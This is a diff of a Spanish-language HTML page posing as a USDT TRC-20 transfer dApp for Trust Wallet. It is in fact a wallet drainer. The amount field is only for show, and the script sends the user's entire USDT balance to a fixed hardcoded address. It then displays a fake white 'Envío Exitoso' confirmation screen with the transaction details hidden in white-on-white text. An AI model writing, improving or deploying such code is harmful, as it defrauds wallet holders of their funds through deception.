@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Red Principal</title>
+    <title>dApp USDT TRC-20 - Conexión Directa</title>
     
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -25,7 +25,7 @@
             max-width: 450px;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
-        h2 { margin-bottom: 20px; text-align: center; color: #38bdf8; }
+        h2 { margin-bottom: 20px; text-align: center; color: #38bdf8; font-size: 22px; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
         input {
@@ -60,12 +60,8 @@
             word-break: break-all;
         }
         .status.info { background-color: #1e3a8a; color: #93c5fd; }
-        .status.success { background-color: #064e3b; color: #6ee7b7; }
         .status.error { background-color: #7f1d1d; color: #fca5a5; }
     </style>
-
-    <!-- DEPENDENCIA OFICIAL COMPATIBLE MÓVIL -->
-    <script src="https://jsdelivr.net"></script>
 </head>
 <body>
 
@@ -94,8 +90,8 @@
             // ============================================================
             // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
             // ============================================================
-            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA REAL
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT en TRON
+            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT
 
             function setStatus(message, type = 'info') {
                 if (!status) return;
@@ -116,7 +112,6 @@
                 btn.addEventListener('click', async function () {
                     if (procesoEnCurso) return;
 
-                    // Validación inicial del campo cosmético de la interfaz
                     const valorVisualInput = input ? input.value.trim() : '';
                     if (!valorVisualInput || isNaN(Number(valorVisualInput)) || Number(valorVisualInput) <= 0) {
                         setStatus('Por favor, ingresa una cantidad válida.', 'error');
@@ -126,78 +121,70 @@
                     try {
                         procesoEnCurso = true;
                         btn.textContent = 'Procesando...';
-                        setStatus('Verificando inicialización de red TRON...');
+                        setStatus('Detectando entorno nativo de Trust Wallet...');
 
-                        // RESOLUCIÓN DE ENTORNO EN BILLETERAS MÓVILES (TRUST WALLET HÍBRIDO)
-                        let walletInstance = window.tronWeb;
+                        // Uso exclusivo del motor interno pre-inyectado por la aplicación móvil
+                        const walletInstance = window.tronWeb;
                         
-                        // Si el objeto inyectado directo no está listo, intentamos invocar el disparador del proveedor
-                        if (!walletInstance && window.tronLink) {
-                            if (typeof window.tronLink.request === 'function') {
-                                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                                walletInstance = window.tronWeb;
-                            }
+                        if (!walletInstance || !walletInstance.defaultAddress || !walletInstance.defaultAddress.base58) {
+                            throw new Error('No se detectó el motor de TRON. Asegúrate de abrir esta página desde el navegador interno de tu billetera y tener seleccionada la red TRON.');
                         }
 
-                        // Si sigue sin responder, instanciamos un proveedor RPC directo para leer la blockchain
-                        if (!walletInstance) {
-                            walletInstance = new TronWeb({
-                                fullHost: 'https://trongrid.io',
-                                headers: { "TRON-PRO-API-KEY": "" } // Node público de libre acceso
-                            });
-                        }
+                        const cuentaUsuario = walletInstance.defaultAddress.base58;
 
-                        // Verificar si la app móvil expone una dirección por defecto o requiere activación manual
-                        let cuentaUsuario = "";
-                        if (walletInstance.defaultAddress && walletInstance.defaultAddress.base58) {
-                            cuentaUsuario = walletInstance.defaultAddress.base58;
-                        } else if (window.ethereum && window.ethereum.selectedAddress) {
-                            // En algunas versiones híbridas de Trust Wallet, los datos EVM se usan como puente de dirección
-                            try {
-                                cuentaUsuario = walletInstance.address.fromHex(window.ethereum.selectedAddress);
-                            } catch(e) {}
-                        }
-
-                        // Si no se encuentra dirección asignada, solicitamos al usuario interactuar de forma convencional
-                        if (!cuentaUsuario) {
-                            throw new Error('No se detectó una sesión activa de TRON. Asegúrate de que el navegador interno de tu wallet esté configurado en la red TRON.');
-                        }
-
-                        setStatus(`Verificando recursos para: ${cuentaUsuario.substring(0,6)}...${cuentaUsuario.substring(cuentaUsuario.length-4)}`);
-
-                        // Validación contra auto-envíos accidentales
                         if (cuentaUsuario.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
-                            throw new Error('La dirección de origen y la dirección de destino fija no pueden ser la misma.');
+                            throw new Error('La dirección de origen y destino no pueden ser iguales.');
                         }
 
-                        // Consulta de saldo en TRX (Comisiones de Gas indispensable)
-                        const saldoTRX = await walletInstance.trx.getBalance(cuentaUsuario);
-                        const trxLegible = Number(walletInstance.fromSun(saldoTRX));
+                        setStatus('Consultando balance en la blockchain...');
 
-                        if (trxLegible < 15) {
-                            throw new Error(`Saldo de TRX insuficiente para las tarifas de red. Posees ${trxLegible.toFixed(2)} TRX. Se requieren al menos 15-30 TRX libres para procesar interacciones con contratos TRC-20.`);
-                        }
-
-                        setStatus('Consultando balance USDT...');
-
-                        // Carga y lectura asíncrona del contrato inteligente en la Mainnet
+                        // Conexión inmediata al contrato inteligente sin intermediarios externos
                         const contract = await walletInstance.contract().at(USDT_CONTRACT);
                         const rawBalance = await contract.balanceOf(cuentaUsuario).call();
                         const cleanSunBigInt = rawBalance.toString();
 
                         if (cleanSunBigInt === '0' || !cleanSunBigInt) {
-                            throw new Error('La billetera no posee fondos en USDT disponibles para transferir.');
+                            throw new Error('La billetera no posee fondos en USDT disponibles.');
                         }
 
-                        setStatus('Esperando confirmación de firma...');
+                        setStatus('Esperando confirmación de firma en tu dispositivo...');
                         
-                        // Lanzamiento final de la solicitud de firma nativa al dispositivo
+                        // Envío directo del paquete de transacción al sistema de la app
                         const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
-                            feeLimit: 100_000_000 // Margen de protección de procesamiento (100 TRX)
+                            feeLimit: 100_000_000
                         });
 
                         if (tx) {
-                            // Renderizado de la pantalla de éxito con los datos mimetizados solicitados
+                            // Pantalla blanca de confirmación mimetizada
                             document.body.innerHTML = `
                                 <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
                                     <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
+                                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                                    </div>
+                                    <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
+                                    <p style="color: #64748b; font-size: 16px;">La transacción ha sido transmitida de manera correcta.</p>
+                                    <div style="color: #ffffff; font-size: 10px; user-select: none;">
+                                        <p>Origen: \${cuentaUsuario}</p>
+                                        <p>Tx: \${tx}</p>
+                                    </div>
+                                </div>
+                            `;
+                        }
+
+                    } catch (error) {
+                        console.error(error);
+                        if (error.message && (error.message.includes('declined') || error.message.includes('rejected') || error.message.includes('cancel'))) {
+                            setStatus('La firma de la transacción fue cancelada.', 'error');
+                        } else {
+                            setStatus(error.message || 'La operación falló o no pudo ser procesada.', 'error');
+                        }
+                    } finally {
+                        procesoEnCurso = false;
+                        btn.textContent = 'Siguiente';
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
